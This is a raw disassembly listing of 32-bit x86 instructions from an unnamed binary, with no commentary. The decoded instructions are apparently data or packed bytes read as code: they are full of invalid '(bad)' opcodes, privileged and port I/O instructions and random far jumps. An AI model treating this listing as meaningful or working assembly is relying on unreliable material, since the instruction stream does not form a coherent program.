  42d9e1:	jne    0x42d9b0
  42d9e3:	lahf   
  42d9e4:	loope  0x42d98f
  42d9e6:	inc    ebx
  42d9e7:	mov    edi,eax
  42d9e9:	scas   eax,DWORD PTR es:[edi]
  42d9ea:	xchg   esi,eax
  42d9eb:	cmp    edx,ecx
  42d9ed:	imul   eax,DWORD PTR [eax],0x0
	...
  42da54:	add    BYTE PTR [eax],al
  42da56:	stc    
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	cld    
  42da63:	inc    ebp
  42da64:	test   BYTE PTR [ebp+0x67],ch
  42da67:	jmp    0x142da6d
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	sbb    ah,dl
  42da70:	sub    BYTE PTR [ebp-0x467539de],ah
  42da76:	aas    
  42da77:	or     DWORD PTR [esp+esi*2+0x77d57791],ebx
  42da7e:	fmul   QWORD PTR [edx+0x349064a]
  42da84:	mov    edi,cr3
  42da87:	sub    ch,BYTE PTR [edx]
  42da89:	mov    BYTE PTR [edx+0x705f6385],0xa3
  42da90:	inc    ebp
  42da91:	repz adc cl,bh
  42da94:	pop    edi
  42da95:	ins    BYTE PTR es:[edi],dx
  42da96:	mov    ah,0x35
  42da98:	mov    ds:0xb6336139,al
  42da9d:	sub    BYTE PTR [ecx],dl
  42da9f:	xchg   ebp,eax
  42daa0:	pop    ss
  42daa1:	mov    esi,0xf6b17e1a
  42daa6:	mov    ds:0xc57e8c44,eax
  42daab:	cwde   
  42daac:	mov    BYTE PTR [eax+edi*1+0x5f],al
  42dab0:	loope  0x42da7b
  42dab2:	push   edi
  42dab3:	cdq    
  42dab4:	sar    BYTE PTR [ebx-0x74d12f1a],0x56
  42dabb:	ja     0x42da5a
  42dabd:	ss jb  0x42da54
  42dac0:	sub    ebp,ecx
  42dac2:	repnz cmp DWORD PTR [edi],edi
  42dac5:	mov    BYTE PTR [ecx-0x42],dh
  42dac8:	mov    edx,0x1e9b58e4
  42dacd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dace:	or     BYTE PTR [ecx-0x68861184],al
  42dad4:	xor    eax,0xc76ca3fb
  42dad9:	jo     0x42da8a
  42dadb:	ror    esp,0x21
  42dade:	xchg   ebx,eax
  42dadf:	out    dx,al
  42dae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dae1:	mov    ?,edx
  42dae3:	mov    al,0xa2
  42dae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dae6:	pop    edi
  42dae7:	ins    BYTE PTR es:[edi],dx
  42dae8:	mov    ebp,0xfcbe178
  42daed:	cmp    al,0x52
  42daef:	arpl   WORD PTR [ebx+0x17d35cd0],ax
  42daf5:	ret    
  42daf6:	mov    ch,0x1b
  42daf8:	(bad)  
  42daf9:	inc    esi
  42dafa:	push   es
  42dafb:	loope  0x42db3d
  42dafd:	jg     0x42dab3
  42daff:	lods   eax,DWORD PTR ds:[esi]
  42db00:	xchg   esp,eax
  42db01:	(bad)  
  42db02:	mov    dl,0x62
  42db04:	sbb    eax,0x9c391618
  42db09:	fcom   QWORD PTR [eax-0x61]
  42db0c:	stos   BYTE PTR es:[edi],al
  42db0d:	xchg   DWORD PTR [eax+0x3f],edi
  42db10:	jecxz  0x42dada
  42db12:	add    DWORD PTR [ecx+0x63],edi
  42db15:	adc    esi,DWORD PTR [ebx]
  42db17:	sti    
  42db18:	mov    esp,0xdafc201
  42db1d:	and    DWORD PTR [edx+0xc41f93f],ebx
  42db23:	and    al,0xf
  42db25:	iret   
  42db26:	outs   dx,BYTE PTR ds:[esi]
  42db27:	(bad)  
  42db28:	std    
  42db29:	pop    eax
  42db2a:	pop    ecx
  42db2b:	(bad)  
  42db2c:	lds    ebx,FWORD PTR [esp+esi*2+0x3a]
  42db30:	xchg   edi,eax
  42db31:	retf   0x53f1
  42db34:	and    ebx,edx
  42db36:	dec    edx
  42db37:	inc    ecx
  42db38:	jo     0x42db95
  42db3a:	arpl   bp,cx
  42db3c:	aad    0x81
  42db3e:	sbb    bl,BYTE PTR [edi+0x63cb6105]
  42db44:	inc    edx
  42db45:	aaa    
  42db46:	rcl    DWORD PTR [eax+0x37597f32],cl
  42db4c:	mov    al,bh
  42db4e:	pop    edx
  42db4f:	pop    edi
  42db50:	out    dx,al
  42db51:	and    cl,BYTE PTR [ebx+0x6c]
  42db54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db55:	aam    0x29
  42db57:	pop    ebx
  42db58:	int    0xf0
  42db5a:	ret    
  42db5b:	pop    eax
  42db5c:	mov    ah,0x8c
  42db5e:	mov    BYTE PTR [edi-0x27],al
  42db61:	out    0xd1,eax
  42db63:	in     eax,dx
  42db64:	ja     0x42db9e
  42db66:	cmp    DWORD PTR [esi],ecx
  42db68:	fwait
  42db69:	ds pop ebp
  42db6b:	cwde   
  42db6c:	xor    ecx,edx
	...
  42dbd6:	mov    al,0x7a
  42dbd8:	pop    ds
  42dbd9:	ins    BYTE PTR es:[edi],dx
  42dbda:	fild   QWORD PTR [ebp-0xd]
  42dbdd:	(bad)  
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dbc2
  42dbe3:	xchg   esi,eax
  42dbe4:	(bad)  
  42dbe5:	sti    
  42dbe6:	addr16 jmp 0x0:0x1000001
  42dbee:	fiadd  WORD PTR [esi-0x46]
  42dbf1:	xchg   esp,eax
  42dbf2:	push   ebx
  42dbf3:	dec    edx
  42dbf4:	fisub  WORD PTR [edi+0x26]
  42dbf7:	fist   DWORD PTR [ebx-0x534d773c]
  42dbfd:	mov    ch,0x37
  42dbff:	fcom   DWORD PTR [eax]
  42dc01:	dec    ebx
  42dc02:	inc    ebp
  42dc03:	add    bl,0xcb
  42dc06:	mov    edi,0xfd3557d8
  42dc0b:	(bad)  
  42dc0c:	pusha  
  42dc0d:	sahf   
  42dc0e:	aam    0x25
  42dc10:	rol    esp,0xb6
  42dc13:	sbb    DWORD PTR [eax+edx*2-0x59de1597],edx
  42dc1a:	ds cld 
  42dc1c:	and    ah,BYTE PTR [esi+eax*4+0x5e]
  42dc20:	jg     0x42dc99
  42dc22:	dec    eax
  42dc23:	pushf  
  42dc24:	nop
  42dc25:	(bad)  [edi+0x41127bdf]
  42dc2b:	adc    dh,BYTE PTR [ecx-0x6a]
  42dc2e:	call   0x3e8b7c83
  42dc33:	mov    ebx,0xbb51309d
  42dc38:	mov    al,0x4b
  42dc3a:	pop    edx
  42dc3b:	push   ebx
  42dc3c:	mov    esp,0xb7c9ba01
  42dc41:	stos   BYTE PTR es:[edi],al
  42dc42:	fisubr DWORD PTR [edi-0x24]
  42dc45:	mov    ds:0x753158e5,eax
  42dc4a:	arpl   WORD PTR [ecx+0x57],si
  42dc4d:	gs icebp 
  42dc4f:	pop    ss
  42dc50:	hlt    
  42dc51:	loop   0x42dc5a
  42dc53:	stos   DWORD PTR es:[edi],eax
  42dc54:	push   0x42
  42dc56:	dec    edi
  42dc57:	adc    eax,0x39bcc630
  42dc5c:	fidivr WORD PTR [eax]
  42dc5e:	xchg   ebx,eax
  42dc5f:	or     eax,DWORD PTR [ebp-0x56d5ca79]
  42dc65:	add    al,0xe7
  42dc67:	std    
  42dc68:	nop
  42dc69:	in     al,0xdf
  42dc6b:	test   BYTE PTR [ebp+ebp*2-0x3ca7014c],0x9f
  42dc73:	fild   QWORD PTR [ebp-0x2b]
  42dc76:	lea    ebp,[edi-0x7a]
  42dc79:	xchg   esi,eax
  42dc7a:	mov    ch,0x30
  42dc7c:	mov    esp,0x77f130aa
  42dc81:	out    dx,eax
  42dc82:	push   ebp
  42dc83:	or     al,BYTE PTR [ecx+0x5f]
  42dc86:	jbe    0x42dc55
  42dc88:	mov    al,0xb8
  42dc8a:	outs   dx,DWORD PTR ds:[esi]
  42dc8b:	jmp    0x7e33:0x7e482cc9
  42dc92:	inc    DWORD PTR [esi]
  42dc94:	aam    0x9d
  42dc96:	sbb    al,0xcf
  42dc98:	(bad)  
  42dc99:	and    esp,DWORD PTR [edi-0x1d]
  42dc9c:	mov    bl,0x33
  42dc9e:	(bad)  
  42dc9f:	fcmovb st,st(7)
  42dca1:	xor    bl,dh
  42dca3:	and    eax,DWORD PTR [ebx+eiz*4]
  42dca6:	jns    0x42dcbd
  42dca8:	inc    edi
  42dca9:	ret    
  42dcaa:	sub    al,0xbb
  42dcac:	mov    BYTE PTR ds:0x70ab6c,bh
  42dcb2:	xchg   ebx,eax
  42dcb3:	std    
  42dcb4:	out    0x5,eax
  42dcb6:	repz pop esi
  42dcb8:	popa   
  42dcb9:	into   
  42dcba:	fs ret 0xbb00
  42dcbe:	xor    BYTE PTR [ecx],ah
  42dcc0:	mov    esp,0x82290752
  42dcc5:	arpl   WORD PTR [eax],cx
  42dcc7:	inc    esp
  42dcc8:	push   esp
  42dcc9:	or     dl,cl
  42dccb:	sub    dh,BYTE PTR [esi+0x65]
  42dcce:	repnz sbb bl,BYTE PTR [eax]
  42dcd1:	ins    BYTE PTR es:[edi],dx
  42dcd2:	bts    DWORD PTR [ebx-0x2668092b],eax
  42dcd9:	xor    BYTE PTR [edx+ebx*8],al
  42dcdc:	leave  
  42dcdd:	mov    ecx,ss
  42dcdf:	pop    eax
  42dce0:	xchg   BYTE PTR [ebp+0x5981682],dh
  42dce6:	and    DWORD PTR [ebp-0x12c2ed1e],ebp
  42dcec:	shr    ch,0x0
	...
  42dd53:	add    BYTE PTR [eax],al
  42dd55:	add    BYTE PTR [ecx],bh
  42dd57:	mov    bh,0x6d
  42dd59:	pxor   mm3,mm7
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	mov    cl,0x6e
  42dd64:	mov    edi,0x1eb6798
  42dd69:	add    BYTE PTR [eax],al
  42dd6b:	add    DWORD PTR [eax],eax
  42dd6d:	add    BYTE PTR [edx],dl
  42dd6f:	pop    edi
  42dd70:	imul   ecx,DWORD PTR [esp+ebx*2-0x11d4d682],0xffffffb1
  42dd78:	clc    
  42dd79:	pusha  
  42dd7a:	aas    
  42dd7b:	adc    cl,BYTE PTR [edi+0x33]
  42dd7e:	ret    0x7772
  42dd81:	add    eax,0x38f58549
  42dd86:	aam    0xd
  42dd88:	pop    ebp
  42dd89:	jns    0x42ddea
  42dd8b:	rcl    DWORD PTR [ecx+edx*1-0x6acf14b7],1
  42dd92:	addr16 dec eax
  42dd94:	adc    al,0x4c
  42dd96:	pop    es
  42dd97:	add    al,0x63
  42dd99:	sar    DWORD PTR [ebx+0x7fe8a79c],1
  42dd9f:	sub    dl,BYTE PTR [ecx+ebx*1-0x173b1bac]
  42dda6:	xor    bl,BYTE PTR [edi+0xc]
  42dda9:	jmp    0xecaa:0xcccbd3c
  42ddb0:	jp     0x42dd96
  42ddb2:	sub    DWORD PTR [ecx-0x2e],edx
  42ddb5:	loope  0x42ddc5
  42ddb7:	sub    edx,DWORD PTR [esi]
  42ddb9:	jp     0x42dd7c
  42ddbb:	push   ds
  42ddbc:	fldcw  WORD PTR [ebx+ebx*1+0x55]
  42ddc0:	in     eax,dx
  42ddc1:	adc    cl,BYTE PTR [ebp+0x1c]
  42ddc4:	pop    edi
  42ddc5:	ficom  WORD PTR [edx+0x518cc5b1]
  42ddcb:	xor    ecx,edi
  42ddcd:	pop    edx
  42ddce:	xchg   ebx,esp
  42ddd0:	mov    ecx,0x843d680e
  42ddd5:	into   
  42ddd6:	mov    DWORD PTR [ebp+0x6e846d39],esi
  42dddc:	mov    esi,ss
  42ddde:	data16 clc 
  42dde0:	rol    edi,1
  42dde2:	push   edx
  42dde3:	ret    
  42dde4:	jne    0x42dd90
  42dde6:	and    BYTE PTR [ecx],bh
  42dde8:	mov    esi,0xe58e2d02
  42dded:	mov    ds,esp
  42ddef:	rcr    BYTE PTR [ebp+0x6e],cl
  42ddf2:	jnp    0x42de48
  42ddf4:	push   edi
  42ddf5:	xor    DWORD PTR [eax-0x45f2229d],0xb6d5e0e1
  42ddff:	ins    DWORD PTR es:[edi],dx
  42de00:	jb     0x42dda2
  42de02:	xchg   esp,eax
  42de03:	cmp    edx,DWORD PTR [eax+0x19]
  42de06:	mov    dh,0x6
  42de08:	in     eax,dx
  42de09:	add    edx,DWORD PTR [ebx+0x7d466df8]
  42de0f:	xor    BYTE PTR gs:[ebp+0x3733d247],0x91
  42de17:	arpl   WORD PTR [edx-0xa],bp
  42de1a:	push   esp
  42de1b:	mov    DWORD PTR [ebx-0x712eded],ebp
  42de21:	out    dx,eax
  42de22:	xor    BYTE PTR [eax+0x472cafb8],ah
  42de28:	adc    cl,dh
  42de2a:	mov    eax,ds:0xfd3a37b9
  42de2f:	cmp    al,0x8c
  42de31:	shld   edx,ebx,cl
  42de34:	int3   
  42de35:	xchg   edi,eax
  42de36:	shr    DWORD PTR [ebp+0x1ddc843c],0x8f
  42de3d:	sub    al,0x19
  42de3f:	dec    esp
  42de40:	pop    ecx
  42de41:	and    al,0xa8
  42de43:	in     eax,dx
  42de44:	adc    BYTE PTR ds:0xa54418e8,al
  42de4a:	nop
  42de4b:	pop    es
  42de4c:	xor    eax,0x1c11bd5d
  42de51:	and    dl,ch
  42de53:	out    0x25,al
  42de55:	inc    ecx
  42de56:	pop    esi
  42de57:	jmp    0x70da7f72
  42de5c:	mov    ch,0xcb
  42de5e:	xor    esp,ebx
  42de60:	xchg   BYTE PTR [ebp+0x36fcf685],ah
  42de66:	sub    al,0x41
  42de68:	gs pushf 
  42de6a:	push   edx
  42de6b:	aas    
  42de6c:	jns    0x42de07
	...
  42ded6:	out    0x82,al
  42ded8:	lods   eax,DWORD PTR ds:[esi]
  42ded9:	xor    ebp,ebp
  42dedb:	aas    
  42dedc:	(bad)  
  42dedd:	xlat   BYTE PTR ds:[ebx]
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	mov    ch,0x37
  42dee4:	jns    0x42dea1
  42dee6:	addr16 in al,dx
  42dee8:	add    DWORD PTR [eax],eax
  42deea:	add    BYTE PTR [ecx],al
  42deec:	add    BYTE PTR [eax],al
  42deee:	xor    BYTE PTR [ebx],dh
  42def0:	leave  
  42def1:	out    dx,al
  42def2:	push   edx
  42def3:	sbb    BYTE PTR [edi-0x2e],al
  42def6:	adc    cl,BYTE PTR [ebp-0x75ec41d8]
  42defc:	mov    esi,0x9ba74afe
  42df01:	mov    BYTE PTR [edi+edi*4-0x59],bl
  42df05:	sub    al,0x9a
  42df07:	dec    ebp
  42df08:	push   esp
  42df09:	loop   0x42debb
  42df0b:	ficom  DWORD PTR [edi+eax*8-0x2ace9b1e]
  42df12:	movups xmm4,XMMWORD PTR [edx+0x39ad057a]
  42df19:	outs   dx,DWORD PTR ds:[esi]
  42df1a:	data16 (bad) [ebx-0x6990eaa5]
  42df21:	xchg   edi,eax
  42df22:	cmp    eax,0x52168c03
  42df27:	aad    0x2e
  42df29:	lea    ecx,[ebp-0x2ed7b8d6]
  42df2f:	jle    0x42df0e
  42df31:	sbb    al,0x1
  42df33:	pusha  
  42df34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df35:	aas    
  42df36:	add    al,0xdd
  42df38:	jecxz  0x42df98
  42df3a:	lea    ecx,[ecx]
  42df3c:	outs   dx,BYTE PTR ds:[esi]
  42df3d:	dec    eax
  42df3e:	or     al,0xc5
  42df40:	imul   ebp,ecx,0x6f6ca4b8
  42df46:	mov    bh,0xc0
  42df48:	xchg   esi,eax
  42df49:	jmp    0xb21e:0xc1152d12
  42df50:	sub    dh,BYTE PTR [edx]
  42df52:	leave  
  42df53:	dec    edi
  42df54:	pop    ebp
  42df55:	xchg   DWORD PTR [edx-0x8],ebp
  42df58:	jbe    0x42df5b
  42df5a:	ins    BYTE PTR es:[edi],dx
  42df5b:	xchg   esi,eax
  42df5c:	and    ebx,DWORD PTR [esi-0x7d4d3fa8]
  42df62:	jle    0x42df88
  42df64:	ins    BYTE PTR es:[edi],dx
  42df65:	jl     0x42dfa1
  42df67:	or     BYTE PTR [esi+0x56],ah
  42df6a:	mov    bh,0xa
  42df6c:	jmp    0xb54abc95
  42df71:	xchg   ecx,eax
  42df72:	stos   BYTE PTR es:[edi],al
  42df73:	adc    ebp,esp
  42df75:	push   ebx
  42df76:	adc    al,0x67
  42df78:	jo     0x42dfe6
  42df7a:	imul   esp,edi,0x54a88efe
  42df80:	mov    esi,0xab71dbde
  42df85:	stc    
  42df86:	popa   
  42df87:	loope  0x42df7f
  42df89:	pop    es
  42df8a:	in     eax,dx
  42df8b:	mov    bl,0x6c
  42df8d:	(bad)  
  42df8e:	fldcw  WORD PTR [edi+ebp*4]
  42df91:	adc    edx,DWORD PTR gs:[esi]
  42df94:	ja     0x42dff4
  42df96:	or     eax,0x24fcb697
  42df9b:	es int3 
  42df9d:	add    eax,0xa9891b40
  42dfa2:	mov    WORD PTR [esi+0x56],gs
  42dfa5:	ja     0x42dff0
  42dfa7:	arpl   WORD PTR [ecx-0x61],bx
  42dfaa:	pop    es
  42dfab:	dec    esp
  42dfac:	or     dl,cl
  42dfae:	mov    eax,ds:0x9d84d95
  42dfb3:	(bad)  
  42dfb5:	add    ch,bl
  42dfb7:	push   cs
  42dfb8:	cmp    edi,DWORD PTR [ecx]
  42dfba:	jb     0x42dfe2
  42dfbc:	leave  
  42dfbd:	sub    BYTE PTR [ecx+0x68],0xa2
  42dfc1:	test   al,0x60
  42dfc3:	sti    
  42dfc4:	(bad)  
  42dfc5:	dec    esi
  42dfc6:	sub    DWORD PTR [ebp+0x68],ebp
  42dfc9:	ins    BYTE PTR es:[edi],dx
  42dfca:	mov    ch,0xd0
  42dfcc:	call   0xcb18:0xcfe38dbd
  42dfd3:	pop    es
  42dfd4:	sbb    DWORD PTR [edi-0x56d759e3],0xffffffab
  42dfdb:	fs retf 0xa74
  42dfdf:	xchg   esi,eax
  42dfe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dfe1:	dec    edx
  42dfe2:	or     al,0x16
  42dfe4:	mov    BYTE PTR [edi+0x32],cl
  42dfe7:	push   ebp
  42dfe8:	in     al,0xad
  42dfea:	dec    esp
  42dfeb:	inc    eax
  42dfec:	mov    al,0xdf
	...
  42e056:	add    bh,dh
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi-0x44]
  42e063:	xor    cl,BYTE PTR ds:0x1ed677d
  42e069:	add    BYTE PTR [eax],al
  42e06b:	add    DWORD PTR [eax],eax
  42e06d:	add    BYTE PTR [esi],ch
  42e06f:	cwde   
  42e070:	lock push cs
  42e072:	aad    0x8f
  42e074:	in     eax,0xd3
  42e076:	add    ah,BYTE PTR es:[edi]
  42e079:	dec    edi
  42e07a:	xchg   edi,eax
  42e07b:	repz add ah,ch
  42e07e:	add    eax,0x24f271ac
  42e083:	outs   dx,DWORD PTR ds:[esi]
  42e084:	jmp    0x42e0c9
  42e086:	pop    ebp
  42e087:	stc    
  42e088:	jge    0x42e053
  42e08a:	dec    ecx
  42e08b:	ins    BYTE PTR es:[edi],dx
  42e08c:	jle    0x42e031
  42e08e:	xchg   ebp,eax
  42e08f:	xor    DWORD PTR [ebx],edx
  42e091:	push   ebx
  42e093:	xchg   ebx,eax
  42e094:	dec    ecx
  42e095:	fwait
  42e096:	mov    eax,ds:0x28d5d078
  42e09b:	xor    BYTE PTR [ecx+ebp*4],0xaa
  42e09f:	fisubr DWORD PTR [edx]
  42e0a1:	mov    eax,ds:0x72b2b76d
  42e0a6:	div    BYTE PTR [ecx+ecx*8+0x69]
  42e0aa:	jb     0x42e03f
  42e0ac:	mov    ebx,0x8482fe1
  42e0b1:	add    DWORD PTR [ebx+0xad6f4c6],ebp
  42e0b7:	or     BYTE PTR [esi+0x13],0x55
  42e0bb:	sub    eax,0x982cfb3b
  42e0c0:	je     0x42e10f
  42e0c2:	stos   DWORD PTR es:[edi],eax
  42e0c3:	xor    al,0xf5
  42e0c5:	pop    edi
  42e0c6:	or     eax,0xac6f1257
  42e0cb:	sub    DWORD PTR [ebx],0xe
  42e0ce:	gs out dx,al
  42e0d0:	jp     0x42e11a
  42e0d2:	test   DWORD PTR [esi],ebp
  42e0d4:	push   edi
  42e0d5:	enter  0xa1d8,0xbe
  42e0d9:	pop    ss
  42e0da:	(bad)  [ebp+0x5]
  42e0dd:	mov    WORD PTR [edi+0x59],?
  42e0e0:	stc    
  42e0e1:	fdiv   QWORD PTR [ecx+0x4d]
  42e0e4:	mov    DWORD PTR [esi-0x4fab7bab],esi
  42e0ea:	jo     0x42e09c
  42e0ec:	cmp    DWORD PTR [esi-0xaabf1ce],edx
  42e0f2:	add    bh,cl
  42e0f4:	fsubr  st(2),st
  42e0f6:	repz and edi,DWORD PTR [edx]
  42e0f9:	cli    
  42e0fa:	mov    WORD PTR [eax],es
  42e0fc:	sub    edx,DWORD PTR [esp+ecx*4+0x22]
  42e100:	bswap  edi
  42e102:	jp     0x42e145
  42e104:	mov    dl,0x4e
  42e106:	aas    
  42e107:	imul   edi,DWORD PTR cs:0xdb165016,0xffffff8c
  42e10f:	xor    ah,BYTE PTR [edx+0x28]
  42e112:	js     0x42e11e
  42e114:	addr16 push edi
  42e116:	push   0xffffffa9
  42e118:	ja     0x42e13e
  42e11a:	pop    esi
  42e11b:	mov    al,ds:0x4a8eddaf
  42e120:	fisttp QWORD PTR [ebp-0x78]
  42e123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e125:	test   DWORD PTR [edx+0x11],edi
  42e128:	xor    ecx,esp
  42e12a:	stos   BYTE PTR es:[edi],al
  42e12b:	stos   BYTE PTR es:[edi],al
  42e12c:	pop    ds
  42e12d:	jmp    0x42e136
  42e12f:	inc    edx
  42e130:	nop
  42e131:	scas   al,BYTE PTR es:[edi]
  42e132:	or     BYTE PTR [ecx-0x3a],al
  42e135:	cmp    cl,cl
  42e137:	mov    ch,0x82
  42e139:	fs mov cl,0x6a
  42e13c:	mov    ecx,0xe25bb13
  42e141:	dec    edi
  42e142:	mov    WORD PTR [ecx+0x47],?
  42e145:	sub    DWORD PTR [ebp-0x6b],edx
  42e148:	fst    QWORD PTR [ecx]
  42e14a:	adc    al,0x36
  42e14c:	xor    eax,0x7602773f
  42e151:	lea    ebx,[eax-0x68]
  42e154:	sar    eax,cl
  42e156:	cli    
  42e157:	add    edx,DWORD PTR [edx]
  42e159:	push   eax
  42e15a:	xchg   ebx,eax
  42e15b:	mov    WORD PTR [esi],es
  42e15d:	outs   dx,BYTE PTR ds:[esi]
  42e15e:	call   0x8908114f
  42e163:	pushf  
  42e164:	and    BYTE PTR [ebx+0x6252f84c],0xe6
  42e16b:	(bad)  
  42e16c:	mov    cl,0x9
	...
  42e1d6:	mov    eax,ds:0x7e061ecf
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	in     al,dx
  42e1e3:	pop    edi
  42e1e4:	cmp    ch,BYTE PTR [edi]
  42e1e6:	addr16 out dx,al
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	add    BYTE PTR [ecx],al
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	mov    es,WORD PTR [edx+ebp*2+0x3732f94e]
  42e1f5:	push   ecx
  42e1f6:	repz inc ebx
  42e1f8:	pop    ecx
  42e1f9:	cmc    
  42e1fa:	arpl   WORD PTR [esp+ebp*8-0x1b],sp
  42e1fe:	ins    DWORD PTR es:[edi],dx
  42e1ff:	mov    al,0xbe
  42e201:	(bad)  
  42e202:	lods   al,BYTE PTR ds:[esi]
  42e203:	outs   dx,DWORD PTR ds:[esi]
  42e204:	jl     0x42e196
  42e206:	arpl   dx,di
  42e208:	jl     0x42e226
  42e20a:	xor    ah,BYTE PTR [edi+0x5c69b737]
  42e210:	inc    edi
  42e211:	test   ch,bh
  42e213:	int    0x2
  42e215:	dec    eax
  42e216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e217:	stos   BYTE PTR es:[edi],al
  42e218:	cmc    
  42e219:	out    0x4b,al
  42e21b:	push   es
  42e21c:	push   ebx
  42e21d:	sbb    al,0x51
  42e21f:	pop    ds
  42e220:	mov    edx,0xb418f7a7
  42e225:	mov    BYTE PTR [edi],dh
  42e227:	sub    eax,0x110b6453
  42e22c:	sbb    esp,DWORD PTR [edx+0x30]
  42e22f:	jns    0x42e28b
  42e231:	inc    esp
  42e232:	pop    ecx
  42e233:	icebp  
  42e234:	shr    DWORD PTR [ebx+eiz*4+0x52094853],1
  42e23b:	rdpmc  
  42e23d:	xor    BYTE PTR [edi+0x7d],cl
  42e240:	mov    esp,0x8b05fd5c
  42e245:	jge    0x42e1e6
  42e247:	and    eax,DWORD PTR [ecx]
  42e249:	rol    BYTE PTR [edx+0x70955d22],1
  42e24f:	mov    cl,0x6b
  42e251:	outs   dx,DWORD PTR ds:[esi]
  42e252:	jl     0x42e20f
  42e254:	jmp    0x42e210
  42e256:	adc    cl,bl
  42e258:	aam    0x3c
  42e25a:	retf   
  42e25b:	sub    DWORD PTR [eax+0x7d228daa],ebx
  42e261:	jge    0x42e221
  42e263:	das    
  42e264:	gs jns 0x42e286
  42e267:	popf   
  42e268:	sti    
  42e269:	inc    esi
  42e26a:	js     0x42e217
  42e26c:	xchg   DWORD PTR fs:[edx],ebx
  42e26f:	add    eax,0x13d911eb
  42e274:	popa   
  42e275:	adc    esi,DWORD PTR [ebx]
  42e277:	rcl    BYTE PTR [ebx+0x71e72156],cl
  42e27d:	popf   
  42e27e:	sub    ecx,DWORD PTR [esi]
  42e280:	cmp    eax,0xb361f96
  42e285:	jmp    0x5a70:0xca9c2cac
  42e28c:	xor    eax,0x7005009b
  42e291:	xor    esp,edx
  42e293:	dec    edx
  42e294:	imul   esp,DWORD PTR [ebx+edx*8],0xe649a107
  42e29b:	add    bl,BYTE PTR [edx+edi*1]
  42e29e:	and    eax,0x603bd193
  42e2a3:	add    al,BYTE PTR [eax+0x2ee19648]
  42e2a9:	imul   edi,DWORD PTR [ecx+0x58],0xffffffc7
  42e2ad:	ins    BYTE PTR es:[edi],dx
  42e2ae:	fs jmp 0x42e2b4
  42e2b1:	xor    esi,DWORD PTR [ebp+0x2d]
  42e2b4:	aas    
  42e2b5:	mov    WORD PTR [esi],gs
  42e2b7:	dec    esi
  42e2b8:	addr16 pop ss
  42e2ba:	cmp    edx,esi
  42e2bc:	sbb    DWORD PTR [edi-0x6893d45a],ebx
  42e2c2:	push   esi
  42e2c3:	repnz or BYTE PTR [edi],dl
  42e2c6:	mov    al,0x7e
  42e2c8:	jne    0x42e2d4
  42e2ca:	xchg   ecx,eax
  42e2cb:	and    esp,DWORD PTR [edi-0x4a6717e1]
  42e2d1:	aas    
  42e2d2:	mov    bl,0xec
  42e2d4:	cwde   
  42e2d5:	add    BYTE PTR [esi+0x31],ch
  42e2d8:	mov    BYTE PTR [ebp-0x40],0xfb
  42e2dc:	mov    al,ds:0x1fa301ab
  42e2e1:	fdiv   DWORD PTR [ebx+0x5e]
  42e2e4:	clc    
  42e2e5:	pop    ss
  42e2e6:	sub    dh,ah
  42e2e8:	ficomp WORD PTR [esi+0x7d86cea0]
	...
  42e356:	lods   eax,DWORD PTR ds:[esi]
  42e357:	cmp    eax,0xb79aa78a
  42e35c:	lods   eax,DWORD PTR ds:[esi]
  42e35d:	aas    
  42e35e:	mov    ebx,0xf2199140
  42e363:	fbld   TBYTE PTR [edx+0x19]
  42e366:	addr16 out dx,eax
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	add    BYTE PTR [ecx],al
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	popa   
  42e36f:	adc    al,0x3b
  42e371:	inc    ebp
  42e372:	mov    cl,0xdb
  42e374:	sbb    eax,DWORD PTR [ebx]
  42e376:	pop    esp
  42e377:	scas   eax,DWORD PTR es:[edi]
  42e378:	push   edx
  42e379:	test   DWORD PTR [ebp-0x109f81ca],edx
  42e37f:	retf   0xbff8
  42e382:	and    al,0x44
  42e384:	test   al,0x23
  42e386:	mov    ecx,0xa2b22950
  42e38b:	sub    BYTE PTR [eax-0x46799cf7],dh
  42e391:	and    ebx,DWORD PTR [eax+0x3dd0dbae]
  42e397:	fidiv  WORD PTR [edi+0x1e]
  42e39a:	out    dx,al
  42e39b:	cdq    
  42e39c:	cmp    eax,0x6076d977
  42e3a1:	test   BYTE PTR [eax],bh
  42e3a3:	pop    ebp
  42e3a4:	ficom  WORD PTR [ebx+0x11b7b11]
  42e3aa:	imul   eax,DWORD PTR [ebx+0x63],0xe7bde9dc
  42e3b1:	pop    ebx
  42e3b2:	ror    esp,0xae
  42e3b5:	sub    eax,0x98c9d6ad
  42e3ba:	gs mov edi,0x69471ffe
  42e3c0:	dec    esi
  42e3c1:	ret    0xd2da
  42e3c4:	shl    esp,1
  42e3c6:	inc    esi
  42e3c7:	adc    DWORD PTR [esi-0x80],ebx
  42e3ca:	sbb    al,0x1
  42e3cc:	cli    
  42e3cd:	pusha  
  42e3ce:	xlat   BYTE PTR ds:[ebx]
  42e3cf:	mov    bh,BYTE PTR [ecx+0x770e5b48]
  42e3d5:	jae    0x42e3f4
  42e3d7:	mov    WORD PTR [edi],ss
  42e3d9:	push   es
  42e3da:	pushf  
  42e3db:	sub    eax,0xa79dfdd6
  42e3e0:	and    al,0xe5
